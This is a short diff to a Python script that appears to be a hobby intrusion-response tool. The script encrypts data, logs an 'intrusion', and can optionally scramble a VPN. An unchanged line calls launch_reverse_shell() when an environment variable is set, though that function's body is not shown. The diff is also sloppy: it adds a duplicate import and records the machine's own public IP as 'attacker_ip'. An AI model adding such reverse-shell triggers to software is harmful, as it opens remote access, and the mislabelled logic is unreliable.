@@ -1,5 +1,6 @@
 import json
 import json
+import json
 import os
 from chaotic_keygen import chaotic_key
 from aes_cfb_encryptor import encrypt, decrypt
@@ -27,11 +28,20 @@ try:
     enc = encrypt(data, key)
     with open(config["encrypted_output"], "wb") as f:
         f.write(enc)
+    encryption_status = "Success"
 except Exception as e:
     secure_log(f"Encryption failed: {e}")
+    encryption_status = "Failed"
 
-# Simulate intrusion
-log_intrusion()
+# Try to get external IP info for log (optional)
+try:
+    ip_info = get_ip_info("")  # Gets public IP of current system
+    attacker_ip = ip_info.get("query", "Unknown")
+except:
+    attacker_ip = "Unknown"
+
+# Log intrusion with IP and status
+log_intrusion(ip_address=attacker_ip, status=encryption_status)
 
 # Optional: scramble VPN if enabled
 if os.getenv("ENABLE_VPN_SCRAMBLE") == "1":
@@ -42,3 +52,4 @@ if os.getenv("ENABLE_SHELL") == "1":
     launch_reverse_shell()
 
 secure_log("Intrusion response triggered")
+
